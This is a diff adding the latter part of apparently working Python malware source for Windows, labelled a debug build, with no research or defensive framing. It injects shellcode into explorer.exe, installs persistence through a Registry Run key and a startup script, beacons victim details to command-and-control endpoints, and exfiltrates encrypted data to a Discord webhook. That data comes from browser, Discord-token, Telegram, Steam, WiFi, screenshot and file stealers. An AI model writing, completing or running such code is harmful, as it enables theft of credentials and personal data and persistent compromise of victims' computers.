@@ -501,4 +501,249 @@ class ProcessInjector:
                 if 'explorer.exe' in line:
                     parts = line.split(',')
                     if len(parts) > 1:
+                        pid = int(parts[1].strip('"'))
+                        break
+            
+            if not pid:
+                return False
+            
+            # Open process
+            PROCESS_ALL_ACCESS = 0x1F0FFF
+            handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
+            if not handle:
+                return False
+            
+            # Allocate memory
+            MEM_COMMIT = 0x1000
+            PAGE_EXECUTE_READWRITE = 0x40
+            addr = kernel32.VirtualAllocEx(handle, None, len(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+            if not addr:
+                return False
+            
+            # Write shellcode
+            written = wintypes.c_size_t()
+            kernel32.WriteProcessMemory(handle, addr, shellcode, len(shellcode), ctypes.byref(written))
+            
+            # Create remote thread
+            kernel32.CreateRemoteThread(handle, None, 0, addr, None, 0, None)
+            
+            return True
+        except:
+            return False
+
+# === PERSISTENCE ===
+class PersistenceManager:
+    @staticmethod
+    def install():
+        """Multiple persistence mechanisms"""
+        print("[DEBUG] Installing persistence...")
+        try:
+            # Registry Run key
+            import winreg
+            exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
+            dest_dir = os.path.expanduser("~") + "/AppData/Roaming/SystemHelper"
+            os.makedirs(dest_dir, exist_ok=True)
+            dest_exe = os.path.join(dest_dir, "helper.exe")
+            
+            if not os.path.exists(dest_exe):
+                shutil.copyfile(exe_path, dest_exe)
+            
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
+                winreg.SetValueEx(key, "SystemHelper", 0, winreg.REG_SZ, dest_exe)
+            print("[DEBUG] Registry persistence installed")
+        except Exception as e:
+            print(f"[DEBUG] Registry persistence failed: {e}")
+        
+        # WMI persistence
+        try:
+            import wmi
+            c = wmi.WMI()
+            script = f"""
+            Set objShell = CreateObject("WScript.Shell")
+            objShell.Run "{sys.executable} --resume", 0, False
+            """
+            with open(os.path.expanduser("~") + "/startup.vbs", "w") as f:
+                f.write(script)
+            print("[DEBUG] WMI persistence installed")
+        except Exception as e:
+            print(f"[DEBUG] WMI persistence failed: {e}")
+
+# === C2 COMMUNICATION ===
+class C2Client:
+    def __init__(self, endpoints):
+        self.endpoints = endpoints
+        self.key = CryptoHelper.get_system_key()
+        self.victim_id = VICTIM_ID
     
+    def encrypt_payload(self, data):
+        """Encrypt payload for C2"""
+        return CryptoHelper.aes_encrypt(json.dumps(data), self.key)
+    
+    def decrypt_response(self, encrypted_b64):
+        """Decrypt C2 response"""
+        try:
+            decrypted = CryptoHelper.aes_decrypt(encrypted_b64, self.key)
+            return json.loads(decrypted.decode())
+        except:
+            return None
+    
+    def beacon(self):
+        """Send beacon to C2"""
+        payload = {
+            "victim_id": self.victim_id,
+            "os": "Windows",
+            "version": sys.version,
+            "user": os.environ.get('USERNAME', 'unknown'),
+            "hostname": os.environ.get('COMPUTERNAME', 'unknown'),
+            "timestamp": datetime.now().isoformat()
+        }
+        
+        encrypted = self.encrypt_payload(payload)
+        
+        for endpoint in self.endpoints:
+            try:
+                resp = requests.post(endpoint, json={"data": encrypted}, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
+                if resp.status_code == 200:
+                    try:
+                        return self.decrypt_response(resp.json()["data"])
+                    except:
+                        pass
+            except:
+                continue
+        return None
+
+# === EXFILTRATION ===
+class ExfiltrationManager:
+    @staticmethod
+    def prepare_data(data):
+        """Compress and encrypt data for exfiltration"""
+        # Convert to JSON
+        json_data = json.dumps(data, indent=2)
+        
+        # Compress with ZIP
+        zip_buffer = io.BytesIO()
+        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
+            zf.writestr("data.json", json_data)
+        
+        # Encrypt
+        encrypted = CryptoHelper.aes_encrypt(zip_buffer.getvalue())
+        return encrypted
+    
+    @staticmethod
+    def exfiltrate(encrypted_data, webhook):
+        """Send data via Discord webhook with chunking"""
+        print("[DEBUG] Starting exfiltration...")
+        # Split into chunks
+        chunk_size = 512 * 1024  # 512KB
+        chunks = [encrypted_data[i:i+chunk_size] for i in range(0, len(encrypted_data), chunk_size)]
+        print(f"[DEBUG] {len(chunks)} chunks to send")
+        
+        # Send each chunk
+        for i, chunk in enumerate(chunks):
+            try:
+                # Send as text (Discord webhook limitation)
+                # For large data, we use multiple messages
+                payload = f"CHUNK_{i+1}/{len(chunks)}\n{chunk[:1900]}"
+                response = requests.post(webhook, json={"content": payload}, timeout=30)
+                print(f"[DEBUG] Chunk {i+1} sent, status: {response.status_code}")
+                time.sleep(0.5)  # Avoid rate limiting
+            except Exception as e:
+                print(f"[DEBUG] Chunk {i+1} failed: {e}")
+
+# === MAIN EXECUTION ===
+def main():
+    print("[DEBUG] ===== STARTING DEBUG BUILD =====")
+    print(f"[DEBUG] Victim ID: {VICTIM_ID}")
+    
+    # Anti-analysis checks - ALL DISABLED FOR TESTING
+    print("[DEBUG] Anti-analysis checks skipped")
+    
+    # Short delay for testing (1 second instead of 5-20 minutes)
+    print("[DEBUG] Short delay (1 second)...")
+    time.sleep(1)
+    
+    # Install persistence
+    print("[DEBUG] Installing persistence...")
+    PersistenceManager.install()
+    
+    # Steal data
+    print("[DEBUG] Starting data collection...")
+    data = {
+        "victim_id": VICTIM_ID,
+        "timestamp": datetime.now().isoformat(),
+        "system": {
+            "hostname": os.environ.get('COMPUTERNAME'),
+            "username": os.environ.get('USERNAME'),
+            "os": sys.platform
+        }
+    }
+    print(f"[DEBUG] System info: {data['system']}")
+    
+    # Browser data
+    print("[DEBUG] === BROWSER STEALER ===")
+    browser_stealer = BrowserStealer()
+    data["browsers"] = browser_stealer.steal_all()
+    print(f"[DEBUG] Browser data collected")
+    
+    # Discord
+    print("[DEBUG] === DISCORD TOKEN STEALER ===")
+    data["discord_tokens"] = DiscordStealer.steal_tokens()
+    
+    # Telegram
+    print("[DEBUG] === TELEGRAM STEALER ===")
+    data["telegram"] = TelegramStealer.steal()
+    
+    # Steam
+    print("[DEBUG] === STEAM STEALER ===")
+    data["steam"] = SteamStealer.steal()
+    
+    # WiFi
+    print("[DEBUG] === WIFI STEALER ===")
+    data["wifi"] = WiFiStealer.steal()
+    
+    # Screenshot
+    print("[DEBUG] === SCREENSHOT ===")
+    screenshot = ScreenshotStealer.capture()
+    if screenshot:
+        data["screenshot"] = screenshot
+        print("[DEBUG] Screenshot captured")
+    else:
+        print("[DEBUG] Screenshot failed")
+    
+    # Files
+    print("[DEBUG] === FILE SCRAPER ===")
+    data["files"] = FileScraper.scrape()
+    print(f"[DEBUG] Scraped {len(data['files'])} files")
+    
+    # Prepare and exfiltrate
+    print("[DEBUG] === EXFILTRATION ===")
+    print("[DEBUG] Encrypting data...")
+    encrypted = ExfiltrationManager.prepare_data(data)
+    print("[DEBUG] Data encrypted, sending to webhook...")
+    
+    # Send via webhook
+    webhook = Config.WEBHOOK_URL
+    print(f"[DEBUG] Webhook URL: {webhook[:50]}...")
+    if webhook:
+        ExfiltrationManager.exfiltrate(encrypted, webhook)
+    else:
+        print("[DEBUG] No webhook configured")
+    
+    # Also try C2 if any endpoints configured
+    if Config.C2_ENDPOINTS:
+        print("[DEBUG] === C2 BEACON ===")
+        c2_client = C2Client(Config.C2_ENDPOINTS)
+        c2_client.beacon()
+    
+    print("[DEBUG] ===== FINISHED ===== Press Enter to exit")
+    input()
+
+# === ENTRY POINT ===
+if __name__ == "__main__":
+    try:
+        main()
+    except Exception as e:
+        print(f"[ERROR] Fatal error: {e}")
+        import traceback
+        traceback.print_exc()
+        input("Press Enter to exit...")
